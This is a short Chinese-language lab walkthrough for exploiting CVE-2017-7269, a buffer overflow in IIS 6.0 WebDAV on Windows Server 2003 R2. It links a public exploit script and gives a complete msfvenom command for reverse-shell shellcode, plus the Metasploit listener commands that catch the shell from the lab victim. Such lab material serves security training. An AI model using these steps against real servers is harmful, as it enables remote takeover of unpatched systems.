0x01

漏洞简介

翻译成中文就是，Microsoft Windows Server 2003 R2 中 Internet 信息服务 (IIS) 6.0 的 WebDAV 服务中的 ScStoragePathFromUrl 函数中的缓冲区溢出允许远程攻击者通过 PROPFIND 请求中以 “If: <http://”  开头的长标头执行任意代码，如 2016 年 7 月或 8 月在外部被利用。

这是一个缓冲区溢出漏洞。


0x02

准备环境

攻击者机器 Kali Linux 192.168.0.10

受害者机器 Windows Server 2003 R2 192.168.0.12

安装 IIS 6.0，并开启 WebDav 服务。


0x03

生成 shellcode 及配置攻击脚本

https://github.com/edwardz246003/IIS_exploit/blob/master/exploit.py

将以上代码下载到本地，重命名为 CVE-2017-7269.py，然后使用 msfvenom 生成 shellcode。

msfvenom -p windows/shell/reverse_tcp LHOST=192.168.0.10 LPORT=4444 PrependMigrate=True PrependMigrateProc="calc.exe" EXITFUNC="process" -b "\x00" -e x86/unicode_mixed BufferRegister=ESI -f raw

以上命令将生成反弹 shell 的 shellcode，其中 LHOST 为攻击者机器 ip，LPORT 为攻击者机器监听的端口，等下我们使用 Metasploit 监听此端口，接受反弹的 shell。

复制生成的 shellcode，替换到 CVE-2017-7269.py 文件，以及修改 ip，如下所示。


0x04

启动 msfconsole，然后依次执行以下命令，开始监听 4444 端口。

use exploit/multi/handlerset payload windows/shell/reverse_tcpset lport 4444set lhost 192.168.0.10exploit

执行攻击脚本

python CVE-2017-7269.py

回到 msfconsole，可以看到 shell 已经反弹成功。
